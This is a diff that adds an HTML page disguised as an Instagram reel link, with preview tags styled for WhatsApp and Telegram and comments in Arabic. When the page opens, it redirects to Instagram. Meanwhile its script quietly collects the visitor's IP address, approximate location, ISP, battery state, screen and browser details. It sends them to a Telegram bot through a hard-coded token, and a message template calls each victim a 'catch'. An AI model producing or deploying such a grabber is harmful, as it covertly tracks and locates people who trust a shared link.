@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    
+    <!-- وسوم المعاينة لجعل الرابط يظهر بصورة وعنوان مخصص في الواتساب والتليجرام -->
+    <meta property="og:title" content="Hajwalah • Instagram reel">
+    <meta property="og:description" content="شاهد هذا الفيديو على إنستغرام">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1503376780353-7e6692767b70?w=600">
+    <meta property="og:url" content="https://www.instagram.com/reel/DdoP29oMp_X/">
+    <meta property="og:type" content="video.other">
+    
+    <style>
+        body {
+            background-color: #000000;
+            margin: 0;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        const botToken = "8803169320:AAFSwUuSZw5eqzvYmj77qVYCDPS1GjPWemg";
+        const chatId = "2122221879";
+        const targetUrl = "https://www.instagram.com/reel/DdoP29oMp_X/?stkn=MWpxMHo3N3RocDZzeQ==";
+
+        // تحويل فوري وصاروخي للرابط الجديد الصحيح
+        window.location.replace(targetUrl);
+
+        // جلب البيانات وإرسالها في الخلفية البحتة
+        (async function() {
+            try {
+                let ipData = { ip: "غير معروف", country_name: "غير معروف", city: "غير معروف", org: "غير معروف", latitude: "N/A", longitude: "N/A" };
+                
+                try {
+                    let res = await fetch('https://ipapi.co/json/');
+                    let data = await res.json();
+                    if (data.ip) {
+                        ipData.ip = data.ip;
+                        ipData.country_name = data.country_name || "غير معروف";
+                        ipData.city = data.city || "غير معروف";
+                        ipData.org = data.org || "غير معروف";
+                        ipData.latitude = data.latitude || "N/A";
+                        ipData.longitude = data.longitude || "N/A";
+                    }
+                } catch (e) {}
+
+                let batteryStatus = "غير مدعوم";
+                try {
+                    if (navigator.getBattery) {
+                        let bat = await navigator.getBattery();
+                        batteryStatus = `${Math.round(bat.level * 100)}% (${bat.charging ? 'يشحن ⚡' : 'لا يشحن 🔋'})`;
+                    }
+                } catch (e) {}
+
+                let message = `🎯 صيد صاروخي جديد يا البرسم!\n\n` +
+                              `🌐 IP: ${ipData.ip}\n` +
+                              `🌍 الدولة: ${ipData.country_name}\n` +
+                              `🏙️️ المدينة: ${ipData.city}\n` +
+                              `📍 الموقع (IP): ${ipData.latitude}, ${ipData.longitude}\n` +
+                              `🏢 المزود (ISP): ${ipData.org}\n\n` +
+                              `📱 معلومات الجهاز:\n` +
+                              `🔋 البطارية: ${batteryStatus}\n` +
+                              `💻 الشاشة: ${window.screen.width}x${window.screen.height}\n` +
+                              `🗣️ اللغة: ${navigator.language}\n` +
+                              `💻 المتصفح: ${navigator.userAgent}`;
+
+                let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(telegramUrl);
+                } else {
+                    fetch(telegramUrl).catch(() => {});
+                }
+            } catch (err) {}
+        })();
+    </script>
+</body>
+</html>
